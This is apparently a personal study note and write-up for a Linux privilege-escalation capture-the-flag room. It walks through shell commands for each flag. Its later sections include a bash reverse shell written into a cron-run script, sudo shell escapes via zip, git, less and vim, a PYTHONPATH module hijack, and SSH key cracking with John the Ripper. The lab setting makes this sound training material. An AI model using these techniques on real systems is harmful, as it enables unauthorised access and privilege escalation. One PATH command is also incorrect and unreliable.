---
tags:
  - grep
  - chmod
  - su
  - encode
  - decode
  - hashing
  - base64
  - RevShell
  - tools
  - cyber_chef
  - ltrace
---
# Linux Agency

***NOTE***: this room need to be done by some knowledge in [This room ](LinuxRoom-1.md)
link : https://tryhackme.com/r/room/linuxagency
writ up: https://waqar-arain.netlify.app/tryhackme/linux-agency/

---

## Task 1, task 2

***Deploy and ssh***

---
# Task 3

- It was better to search in the whole system with `grep` for the word
  ```bash
	  #the -r flag is for searching in folders for files 
	  grep -r `word` /*
	```
- to get as a `super user account of every mission`
  ```bash
	su mission1
	```  
- it's okay from time to time to check the text by `nano` not `cat`
	- to hide something in a file from printing you can add `^M` at the end of it to make it hidden
- **(Mission 11)** With EV's he meant environment variables!!!!!
	- so the solution is to search inside the env variable !!!!
	  ```bash
		  # and the -i flag for the case sensitivity
		  env | grep -i flag
		```
- **(Mission 12)** if the file has no permission you can not access it untill you change it
	- How to change the permission?
	  ```bash
			chmod +r flag.txt
		```
- ***(Mission 14,15,16)*** Use [Cyber Chef👨‍🍳](https://gchq.github.io/CyberChef/) to solve them.
- ***Tools*** [RevShell](https://www.revshells.com/)
- ***(Mission 16)*** it was a fucking compiled sh file just run the damn script!!! -it was a note screaming at myself-
- ***(Mission 17,18,19,20)*** use the right compiler to run the language
- ***(Mission 21)*** he spawned you into an `/bin/sh` try to get back to `/bin/bash`
- ***(Mission 22)*** he spawned you into a python interpreter try to open the `/bin/bash` form it
	- there is a library in python called `pty` that generate terminal with a command you want
	  ```python
		import pty;pty.spawn("/bin/bash")
		```
- ***(Mission 23)*** there was a site hosted in the machine you could know it by seeing the content of `/etc/hosts` and the ***hosts*** file is mentioned in the [Ch3 ](../Linux_basics_for_Hackers_book/ANALYZING_AND_MANAGING_NETWORKS.md)in the LBFH book.
	- to view the site on the server you can use `wget`
	  ```bash
	  wget localhost
		```
- ***(Mission 24)*** there is an important command `ltrace` that traces the libraries called to execute a code or a command, so you can use it to trace what that sh file does in the background and look at the variables it is dealing with ad look at the functions it is using.
- ***(Mission 25)*** you can't use `ls` so enter any char and take a space and hit double tabs and it will show you the files in the directory, to print the content of `flag.txt` we need something other than the `cat` command, lucky us that we have `printf` that acts like the echo command, next we need some expressions to extract the content from the file
  ```bash
  printf %s $(<flag.txt) 
	```
	Lets breakthrough this code:
	- `   printf`: This is a command used to format and print data. It takes a format string followed by arguments to fill in the placeholders in the format string.
    
	- `%s`: This is a format specifier used with `printf` to indicate that the corresponding argument should be treated as a string.
    
	- `$(<flag.txt)`: This part of the command is a command substitution. It reads the contents of the file named `flag.txt` and substitutes it as an argument to `printf`.
		- the `<` means to read the content of the flag
		- `$(....)` it is an expression  that executes whatever is between those brackets as a command, so if it is a text or a number it will return it, if it is command it will run it.
	Last thing, The damn `su` is not working because he cleared the fucking PATH variable!, to make it enter this command that adds the su command to the PATH like normal
	```bash
	export PATH=/bin:/usr/bin/su
	```
	and that should make the `su` works
- ***(Mission 26)*** there is a command named `file` to check the details of a file use it
- ***(Mission 27)*** act like it is a `gz` compressed file that contains a regular file
- ***(Mission 28)*** you are spawned in a ruby interpreter
  1. to exit from it: `exec '/bin/bash'`
  2. to print a text file reversed use the command `rev`
- ***(viktor Mission)*** you can get the logs of the git by 
  ```bash
	git log
	```

---

# Task 4


### Diana's flag

*Well this flag is related to a scheduled process of it happens it executes an `sh` file that you have a read and write permissions on, so the way to get this flag is to put a `bash` reverse shell script in that file and listen till it runs and you get to the shell that has the flag.*
- [Bash Rev-shell scripts](https://gtfobins.github.io/gtfobins/bash/)

So, the **first** thing is to find where the script is, there are two ways:

#### The hard and luck based way 

lets search for it by the `find` command by searching for all the files that `Viktor` owns, and the `47.sh` is the target file.

```bash
find / -user viktor 2>/dev/null | grep .sh
```

Now lets put the `bash` reverse shell script in the file, which you can get from: [GTFobins](https://gtfobins.github.io/gtfobins/bash/)

```bash
echo "bash -c 'exec bash -i &>/dev/tcp/{IP}/{port} <&1'" > 47.sh
```

And wait till the scheduled process runs the script file. 
```bash
nc -lvnp {port}
```

#### The Hint based way

The hint on `tryhackme` says to wait a train or something, the works with schedules, and the scheduled things on Linux is the `crontabs`, and you can find the `crontab` files by this command....

```bash
find / -name crontab 2>/dev/null
```

At this point we are good, but we found a lot of `crontab` files, the file`/etc/crontab` manages the system wide `crontabs` and if we displayed what's in it by `cat`:

```bash
cat /etc/crontab
```

we will find that there is a scheduled process to run a script called `47.sh` in the directory `/opt/scripts`, so like the previous solution let's put the `bash` reverse shell script in it and wait till the script runs.

```bash
echo "bash -c 'exec bash -i &>/dev/tcp/{IP}/{port} <&1'" > 47.sh
```

And listen from another terminal
```bash
nc -lvnp {port}
```

---

#### Silvio's Flag

While you still on the `RevShell` of dalia go and list the commands that dalia allowed to run as `sudo`

```bash
sudo -l
```

then you will find that `dalia` can run the `zip` command as a `sudo` so search for it's script on [GTFobins](https://gtfobins.github.io/gtfobins/bash/) and add before it `sudo -u` to run it as `Silvio`, the script will be like that:

```bash
TF=$(mktemp -u)
sudo -u silvio /usr/bin/zip $TF /etc/hosts -T -TT 'sh #'
rm $TF
```
Now get a good shell...
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

and get your flag....

**a fast note, the hint on `THM` says "Check the Postal Code on the address." it means the `zip` command , very silly ain't it ?!**

---
#### Reza's Flag

The same as `silvio` but it is a `git` permissions:
```bash
sudo -u reza PAGER='sh -c "exec sh 0<&1"' git -p help
``` 

---
####  Jordan's Flag

Check the permissions of Reza with `sudo -l`, you will see that there is a permission on a `python` file that `Reza` can run it as `Jordan`, so as it became usual let's go to [GTFobins](https://gtfobins.github.io/gtfobins/bash/) to get a shell code from there, but wait, the file can't find a module called `shop.py` so we can write a module with that name and put the exploit code we want in it and then run the file again.

The exploit writed in a python script we will use as the missing module.
```bash
echo "import pty;pty.spawn('/bin/bash')" > /tmp/shop.py
```
And now we need to redirect the script to run our module, we can do that by changing the environment variable called `PYTHONPATH`, and by changing it to the path of our written module we can do the evil thing 😈.
```bash
sudo -u jordan PYTHONPATH=/tmp/ /opt/scripts/Gun-Shop.py
```
And use the command `rev` to print the flag in a proper way:
```bash
rev flag.txt
```

---
#### Ken's Flag
The repeating things `sudo -l`, you will find a way with the `less` command, and go to [GTFobins](https://gtfobins.github.io/gtfobins/bash/) and take the shell code...
```bash
sudo -u ken less /etc/profile
!/bin/sh
```

---
#### Sean's Flag
The repeating things `sudo -l`, you will find a way with the `vim` command, and go to [GTFobins](https://gtfobins.github.io/gtfobins/bash/) and take the shell code...
```bash
sudo -u sean vim -c ':!/bin/sh'
```
But where the flag!!!!!!
This command will search recursively in the files to find `sean` written i any file.
```bash
grep -rn "sean{" /var/log 2>/dev/null
```
Then decode the `base64` code..
```bash
echo "VGhlIHBhc3N3b3JkIG9mIHBlbmVsb3BlIGlzIHAzbmVsb3BlCg==" | base64 -d
```

---

#### Penelope's Flag
just enter the password n the previous decoded code.

---
#### Maya's Flag

We have a the binaries of `base64` tool, this binaries have access to run as `maya` because `maya` is the owner of it and the permissions that Penelope has for this file is `r-x` read and execute permissions so `Penelope` can run this code as `Maya`, The flag expected place is in `/home/maya/falg.txt` and while the binaries have access like `Maya` we can access this file letting this file goes and encode the flag then we encode it again.
```bash
./base64 /home/maya/flag.txt | ./base64 -d
```
We conclude from the hint on `tryhackme` site that the flag equals the password of `Maya`...

---
#### Robert's Flag
The file that has the targets says that there is an ssh script opened from `robert` device so first let's got to the directory called`old ssh`, you will find the ssh file, take it and get the hash of it by `ssh2john`:
```bash
ssh2john {ssh file} > {hash file}
```
then go and crack with the `john the ripper` with `rockyou` wordlist..
```bash
sudo john --wordlist=/usr/share/wordlists/rockyou.txt {hash file}
```
And you will get the password, Now go listen to the open ports...
```bash
ss -tulnp
```
The listener is on `127.0.0.1:2222`, now ssh to it with the cracked password...
```bash
ssh -p 2222 robert@127.0.0.1
```
